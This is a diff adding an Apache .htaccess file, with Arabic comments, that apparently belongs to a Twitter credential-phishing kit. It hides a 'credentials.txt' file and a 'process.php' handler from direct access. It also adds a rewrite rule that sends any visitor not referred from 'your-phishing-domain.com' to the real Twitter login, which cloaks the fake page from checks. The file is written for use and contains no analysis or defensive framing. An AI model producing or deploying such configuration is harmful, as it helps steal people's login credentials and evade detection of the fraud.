@@ -1,0 +1,22 @@
+# منع الوصول المباشر إلى الملفات الحساسة
+<Files "credentials.txt">
+    Order allow,deny
+    Deny from all
+</Files>
+
+<Files "process.php">
+    Order allow,deny
+    Deny from all
+</Files>
+
+# إعادة كتابة URLs
+RewriteEngine On
+
+# إعادة توجيه محاولات الوصول إلى Twitter الحقيقي
+RewriteCond %{HTTP_REFERER} !^http://your-phishing-domain\.com [NC]
+RewriteRule ^login$ https://twitter.com/login [R,L]
+
+# ضغط الملفات
+<IfModule mod_deflate.c>
+    AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css application/javascript
+</IfModule>
